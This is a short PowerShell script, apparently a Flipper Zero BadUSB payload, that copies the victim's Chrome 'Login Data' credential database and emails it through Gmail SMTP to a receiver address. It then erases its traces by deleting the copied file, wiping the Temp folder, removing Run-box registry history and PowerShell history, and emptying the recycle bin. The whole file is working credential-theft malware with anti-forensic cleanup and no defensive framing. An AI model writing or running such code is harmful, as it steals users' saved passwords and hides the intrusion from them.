# Editable data
$SMTPServer = 'smtp.gmail.com'
$emailSmtpUser = "FlipperZero.Sender@gmail.com"
$emailSmtpPass = $args[0]
$emailTo = "flipperzero.receiver@gmail.com"

# Copy the data into a good file
$chromeDataFile = "C:\Users\$env:UserName\Desktop\Chrome_Data.txt"
Copy-Item "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" $chromeDataFile

# Send the email below
$sstr = ConvertTo-SecureString -string $emailSmtpPass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -argumentlist $emailSmtpUser, $sstr

Send-MailMessage -From $emailSmtpUser -To $emailTo -Subject $env:UserName -Body "Test" -Attachments $chromeDataFile -SmtpServer $SMTPServer -UseSSL -Credential $cred -Port 587



<# Clean up after self #>

# Clean up files
Remove-Item $chromeDataFile

# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue